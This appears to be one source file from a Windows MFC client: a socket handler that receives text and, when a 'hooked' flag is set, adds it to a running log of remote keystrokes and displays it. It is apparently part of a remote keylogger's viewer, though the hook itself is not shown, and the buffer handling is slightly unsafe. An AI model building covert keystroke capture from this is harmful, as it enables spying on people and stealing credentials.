// ClientSocket.cpp : implementation file
//

#include "pch.h"
#include "Client.h"
#include "ClientSocket.h"


// CClientSocket

CClientSocket::CClientSocket()
{
}

CClientSocket::~CClientSocket()
{

}


// CClientSocket member functions


void CClientSocket::OnReceive(int nErrorCode)
{
	// TODO: Add your specialized code here and/or call the base class
	char msg[1024] = "";
	Receive(msg, 1024);
	// ((CClientApp*)AfxGetApp())->m_pClientView->AddMsg(msg);


	// Handle Keystroke process
	if (((CClientApp*)AfxGetApp())->m_pClientView->m_dlgKSTR.m_isHooked == TRUE)
	{
		((CClientApp*)AfxGetApp())->m_pClientView->m_dlgKSTR.m_strAllKeystroke += msg + CString("\r\n");
		((CClientApp*)AfxGetApp())->m_pClientView->m_dlgKSTR.m_strDisplay.SetWindowTextA(
			((CClientApp*)AfxGetApp())->m_pClientView->m_dlgKSTR.m_strAllKeystroke);
	}

	

	CSocket::OnReceive(nErrorCode);

}
